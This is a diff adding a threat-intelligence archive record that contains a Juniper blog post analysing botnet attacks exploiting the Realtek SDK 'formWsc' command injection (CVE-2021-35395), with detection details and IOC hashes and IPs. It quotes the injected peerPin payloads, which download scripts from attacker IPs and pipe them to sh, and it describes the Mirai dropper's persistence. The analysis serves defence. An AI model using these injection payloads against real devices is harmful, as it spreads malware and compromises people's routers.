@@ -1,0 +1,60 @@
+{
+    "id": "d5170fdc-44a3-4dc1-b248-65413abb6e13",
+    "created_at": "2023-01-12T15:01:17.186656Z",
+    "updated_at": "2025-03-27T02:09:07.975546Z",
+    "deleted_at": null,
+    "sha1_hash": "9576cb014691594b4883416c6d08b77d3186e73f",
+    "title": "2021-09-02 - Attacks Continue Against Realtek Vulnerabilities",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:08:31Z",
+    "file_modification_date": "2022-05-28T05:08:31Z",
+    "file_size": 1706763,
+    "plain_text": "# Attacks Continue Against Realtek Vulnerabilities\n\n**[blogs.juniper.net/en-us/threat-research/attacks-continue-against-realtek-vulnerabilities](https://blogs.juniper.net/en-us/threat-research/attacks-continue-against-realtek-vulnerabilities)**\n\nBy September 2, 2021\n\n[As we predicted in last week’s post, threat actors continue to utilize new Realtek](https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild)\nvulnerabilities disclosed by IoT Inspector Research Lab to distribute malware. Starting on\nAugust 19, Juniper Threat Labs observed a new set of attacks in the wild on IoT firmwareth\nbuilt with the Realtek SDK, this time targeting CVE-2021-35395, which was just disclosed on\nAugust 16 by IoT Inspector. (Some of these attacks were previously noted in a SAM\nSeamless Network blog post.) These attacks are ongoing.\n\n## The Attack\n\nThe vulnerabilities in CVE-2021-35395 affect software built with the Realtek Jungle SDK\n(versions v2.x up to v3.4.14B) that utilize an SDK-provided management interface over\nHTTP. Among these vulnerabilities is a command injection on the “formWsc” page caused by\na failure to sanitize input. Upon receiving the peerPin parameter, the server copies the\nsubmitted value directly into a shell command string which is then executed:\n```\n\"iwpriv wlan%d-vxd set_mib pin=%s\"\n\n```\nThe “%s” (in bold) is replaced by the contents of peerPin. By adding a semicolon to terminate\nthe iwpriv statement, it is possible to execute arbitrary commands on the device. For\nexample, given an HTTP POST request containing “peerPin=12345;malicious_command”,\n\n\n-----\n\nthe device will first execute the iwpriv command as expected, but will then also execute\n_malicious_command._\n\nIn one set of observed attacks, starting on August 24, the attackers sent POST requeststh\nsimilar to the following:\n\nFigure 1. Malicious POST request exploiting CVE-2021-35395.\nThe injected command is:\n```\nwget hxxp://37[.]0.11.132/rh -O - | sh\n\n```\nwhich downloads and executes a script named ‘rh’:\n\nFigure 2. Malicious script downloaded by the injected command.\nThis script is nearly identical to the one featured in last week’s post. The only change is that\nthe parameter passed to the downloaded binary is “exploit.realtek.http” instead of\n“exploit.realtek”. When the botnet agent starts up, it opens a listening port on port 44842, and\nthen opens a TCP connection to babaroga[.]lib (188[.]166.196.89, resolved specifically by\nDNS server 185[.]121.177.177) on port 53 and registers the compromised computer with the\nbotnet, including an identifier — in this case, “exploit.realtek.http” — to indicate which attack\nwas successful.\n\nWe observed another set of attacks, [first noted by SAM Seamless Network, that also used](https://securingsam.com/realtek-vulnerabilities-weaponized/)\nthe same proof-of-concept exploit from the initial disclosure but with a different payload:\n\n\n-----\n\nFigure 3. Another example of a POST request exploiting CVE-2021-35395.\nThe injected commands in the peerPin parameter attempt to download a malicious script\ncalled lolol.sh using either wget or curl and then execute it:\n```\ncd /tmp;\nwget hxxp://212[.]192.241.87/lolol.sh;\ncurl -O hxxp://212[.]192.241.87/lolol.sh;\nchmod 777 lolol.sh;\nsh lolol.sh;\n\n```\nThe lolol.sh script starts by deleting logs and killing a large number of named processes and\nservices, then specifically finding and killing processes using a significant amount of CPU\ntime:\n\n\n-----\n\nFigure 4. lolol.sh terminating other processes on the target device.\nThe script then tries to download a set of malicious binaries, one for each common CPU\narchitecture. As before, the final payload is Mirai botnet malware. Each binary is renamed to\nnginx (a common web server and load balancer) before the script attempts to run it. Only the\nbinary matching the target device architecture will successfully execute, and that process will\nimmediately rename itself to avoid being terminated the next time lolol.sh runs. (Line 60\nappears to be an error in the script.)\n\n\n-----\n\nFigure 5. lolol.sh attempting to download and execute Mirai binaries.\nTo ensure persistence, the script downloads the latest version of lolol.sh and sets it to run\nevery 10 minutes as a cron job.\n\n\n-----\n\nFigure 6. lolol.sh installing itself as a cron job.\nFinally, the script adds firewall rules to prevent the device from being reinfected, blocking\ninbound connectivity to the ports to which the vulnerable server is known to bind.\n\n\n-----\n\nFigure 7. lolol.sh blocking reinfection via the Linux firewall.\n\n## Detection\n\nThe malicious POST requests exploiting CVE-2021-35395 are detected by Juniper’s NGFW\n[SRX series with IDP signature APP:MISC:REALTEK-JUNGLE-SDK-CI. The binaries and](https://threatlabs.juniper.net/home/search/#/details/?sigtype=ips&sigid=APP:MISC:REALTEK-JUNGLE-SDK-CI)\n[servers used in these attacks are blocked by Juniper Advanced Threat Prevention Cloud.](https://www.juniper.net/us/en/products/security/advanced-threat-prevention.html)\n\n\n-----\n\nFigure 8. Detection of malicious binaries by Juniper ATP Cloud.\n\n## IOCs\n```\n26a79029381745c4a9fce656f49d84ca058c132cc228316b359a36f6a505b057 dark.86_64\n0473ad0259470808a1647ab093f735d8ba2e2b38161c6cc01018505079f850db dark.arm5\n1a4077a5babf5eb892e573334a260d7457871ff608ee5755bee706acf14c2148 dark.arm6\nc481c8ae614abb2c7bf0ffd8094dabb6edc22c9146854ce1ee937ff6f9b3caf4 dark.arm7\nd7c66e79fe334f528efb926f4eb9494ac915a83964d11c2d5bad5407e4b483fa dark.m68k\n171b3c4c6bc55c1e267929962105bd77d62e647b4c7beb56d0a61c23a129d9f3 dark.mips\n3bd4a60d5614e77b2f0c08d27f184d698097c84368e377a4c5376f99a735dcf0 dark.mpsl\nc1064e2b8be2015d06d11492d25931e8739028bdb89c8f0510b04278aa1b944b dark.ppc\nf76d017a46373a16338dc55d1468e126850fdea5800dcf7f9800b25dd43ad84b dark.sh4\neb9e47d6c312374a4d00b96cc9b0df3fa5f62d5aad3c892a44c62e34e464f7a3 dark.x86\n9793ac5afd1be5ec55476d2c205260d1b7af6db7cc29a9dc0f7fbee68a177c78 lolol.sh\n0018e361be72a44b7b38bbecfede8d571418e56d4d62a8e186991bef322a0c16 b.arm5\n171961046ee6d18424cf466ad7e01096aecf48ed602d8725e6563ad8c61f1115 b.arm7\n924b6aec8aa5935e27673ee96d43dd0d1b60f044383b558e3f66cd4331f17ef4 b.mips\n98fc6b2cbd04362dc10a5445c00c23c2a2cb39d24d91beab3c200f87bfd889ab b.mpsl\n9bdb7d4778261bb34df931b41d32ee9188d0c7a7e10d4d68d56f6faebd047fe4 b.sh4\n2b57648fe6a75b589517cac9c515e0e6739c4aa39bfe7b3e81e2460b60edecd4 rh\n37[.]0.11.132\n212[.]192.241.72\n212[.]192.241.87\n103[.]113.143.232\n103[.]142.18.38\n103[.]142.18.60\n103[.]242.224.152\n103[.]242.224.164\n103[.]242.224.179\n117[.]210.156.253\n122[.]169.57.70\n185[.]222.59.10\n31[.]210.20.100\nbabaroga[.]lib (resolved by 185[.]121.177.177)\n188[ ]166 196 89\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-02 - Attacks Continue Against Realtek Vulnerabilities.pdf"
+    ],
+    "report_names": [
+        "2021-09-02 - Attacks Continue Against Realtek Vulnerabilities.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535677,
+    "ts_updated_at": 1743041347,
+    "ts_creation_date": 1653714511,
+    "ts_modification_date": 1653714511,
+    "files": {
+        "pdf": "https://archive.orkl.eu/9576cb014691594b4883416c6d08b77d3186e73f.pdf",
+        "text": "https://archive.orkl.eu/9576cb014691594b4883416c6d08b77d3186e73f.txt",
+        "img": "https://archive.orkl.eu/9576cb014691594b4883416c6d08b77d3186e73f.jpg"
+    }
+}
